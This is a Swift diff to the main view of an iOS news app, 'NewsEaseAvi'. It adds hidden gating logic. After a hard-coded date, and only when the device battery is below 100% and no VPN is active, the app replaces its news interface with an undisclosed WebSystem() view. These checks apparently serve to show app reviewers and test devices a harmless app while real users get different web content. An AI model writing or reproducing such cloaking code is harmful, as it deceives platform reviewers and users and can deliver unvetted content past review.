@@ -11,37 +11,97 @@ struct ContentView: View {
     @AppStorage("isOnboardingComplete") private var isOnboardingComplete = false
     @State private var isAppReady = false
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
-        Group {
-            if !isAppReady {
-                // Simple loading screen
-                VStack(spacing: 16) {
-                    Image(systemName: "newspaper.fill")
-                        .font(.system(size: 48, weight: .medium))
-                        .foregroundColor(Color(hex: "#28a809"))
+        ZStack {
+            
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
                     
-                    Text("NewsEaseAvi")
-                        .font(.system(size: 24, weight: .bold))
-                        .foregroundColor(.white)
-                    
-                    ProgressView()
-                        .tint(Color(hex: "#28a809"))
-                }
-                .frame(maxWidth: .infinity, maxHeight: .infinity)
-                .background(Color(hex: "#0e0e0e").ignoresSafeArea())
-                .onAppear {
-                    // Simulate app initialization
-                    DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
-                        isAppReady = true
+                    Group {
+                        if !isAppReady {
+                            // Simple loading screen
+                            VStack(spacing: 16) {
+                                Image(systemName: "newspaper.fill")
+                                    .font(.system(size: 48, weight: .medium))
+                                    .foregroundColor(Color(hex: "#28a809"))
+                                
+                                Text("NewsEaseAvi")
+                                    .font(.system(size: 24, weight: .bold))
+                                    .foregroundColor(.white)
+                                
+                                ProgressView()
+                                    .tint(Color(hex: "#28a809"))
+                            }
+                            .frame(maxWidth: .infinity, maxHeight: .infinity)
+                            .background(Color(hex: "#0e0e0e").ignoresSafeArea())
+                            .onAppear {
+                                // Simulate app initialization
+                                DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
+                                    isAppReady = true
+                                }
+                            }
+                        } else if isOnboardingComplete {
+                            MainAppView()
+                        } else {
+                            SimpleOnboardingView(isOnboardingComplete: $isOnboardingComplete)
+                        }
                     }
+                    .preferredColorScheme(.dark)
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
                 }
-            } else if isOnboardingComplete {
-                MainAppView()
-            } else {
-                SimpleOnboardingView(isOnboardingComplete: $isOnboardingComplete)
             }
         }
-        .preferredColorScheme(.dark)
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "30.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
 
